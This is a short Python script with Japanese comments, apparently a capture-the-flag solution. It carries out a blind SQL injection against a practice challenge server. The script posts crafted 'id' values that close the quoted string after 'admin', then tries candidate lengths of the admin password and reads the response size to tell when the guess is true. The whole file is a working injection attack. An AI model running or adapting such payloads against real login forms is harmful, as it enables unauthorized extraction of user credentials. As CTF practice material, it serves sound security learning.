import requests
url = 'http://ctfq.sweetduet.info:10080/~q6/'
for i in range(1, 100):
    # 1.$idを起点にinjection
    # 2.idはadminでなければならないので,id=adminを入力後エスケープ
    # 3.TRUEになるようなSQL文を書く必要がある
    sql = 'admin\' AND (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') = {counter} --'.format(
        counter=i)
    payload = {
        'id': sql,
    }
    print(sql)
    response = requests.post(url, data=payload)
    print(response)
    if len(response.text) > 2000:
       print('length of the password is {counter}'.format(counter=i))
       break